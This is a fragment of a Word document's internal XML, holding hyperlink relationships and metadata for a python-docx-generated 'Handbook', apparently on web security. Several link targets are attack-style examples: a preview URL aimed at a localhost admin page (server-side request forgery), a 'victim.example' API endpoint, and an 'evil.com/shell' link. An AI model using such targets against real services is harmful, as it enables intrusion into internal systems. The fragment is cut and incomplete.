/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://victim.example/api/me" TargetMode="External" /><Relationship Id="rId31"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example.com/preview?url=http://127.0.0.1:8080/admin" TargetMode="External" /><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://partner.example" TargetMode="External" /><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/" TargetMode="External" /><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://evil.com/shell.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12308</Words>
  <Characters>70160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Handbook</dc:title>
  <dc:subject/>
  <dc:creator>python-docx</dc:creator>
  <cp:keywords/>
  <dc:description>generated by python-docx</dc:description>
  <cp:lastModifiedBy>Aditya Bhardwaj</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-09-18T09:13:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-18T09:13:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>